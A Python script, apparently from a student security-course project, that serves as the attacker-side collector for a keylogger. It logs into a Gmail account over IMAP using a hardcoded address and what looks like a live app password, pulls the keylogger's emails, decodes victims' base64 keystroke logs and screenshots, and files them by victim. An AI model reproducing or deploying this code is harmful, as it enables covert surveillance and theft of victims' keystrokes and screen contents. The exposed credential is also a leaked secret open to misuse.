# This program is the one that the attacker uses to quickly retrieve and decode all data from all victims of the logger
# Simply run it whenever you want to retrieve updated logs and images and it will check your email for the newest data
import base64
import email
import imaplib
import os

# The email retrieval was inspired by tripleee's response on
# https://stackoverflow.com/questions/53827488/reading-unread-emails-using-python-script
your_email = "comp6841student@gmail.com"
your_email_pass = "fcfn euzu phly qzsb "

mail = imaplib.IMAP4_SSL("imap.gmail.com")
mail.login(your_email, your_email_pass)
mail.select("inbox")
# Get all unseen emails
_, data = mail.search(None, "(UNSEEN)")
mail_ids = data[0]

id_list = mail_ids.split()
# check if there are any emails
if not id_list:
    exit()


first_email_id = int(id_list[0])
latest_email_id = int(id_list[-1])
# loop through all unseen emails
for i in range(latest_email_id, first_email_id - 1, -1):
    _, data = mail.fetch(str(i), "(RFC822)")
    for response_part in data:
        if isinstance(response_part, tuple):
            msg = email.message_from_bytes(response_part[1])
            sub: str = msg["subject"]
            # Email subject matches format of log emails from keylogger
            if sub.startswith("(Base64 encoded) From ") and msg["from"] == your_email:
                sub = sub.removeprefix("(Base64 encoded) From ")
                split = sub.rfind("|")
                # Get the email of the victim this is from to store their data in one place
                victim_email = sub[:split]
                file_name = sub[split + 1 :]
                if not os.path.isdir(victim_email):
                    os.mkdir(victim_email)
                file_name = victim_email + "/" + file_name
                data = msg.get_payload()
                output_file = open(file_name, "wb")
                # decode images and logfiles then save them to victims folder
                if file_name.endswith(".png"):
                    output = base64.b64decode(data)
                    output_file.write(output)
                else:
                    output_file.write(
                        base64.b64decode(data)
                        # bytes(
                        #     str(base64.b64decode(data), encoding="utf-8"),
                        #     encoding="utf-8",
                        # )
                    )
                output_file.close()
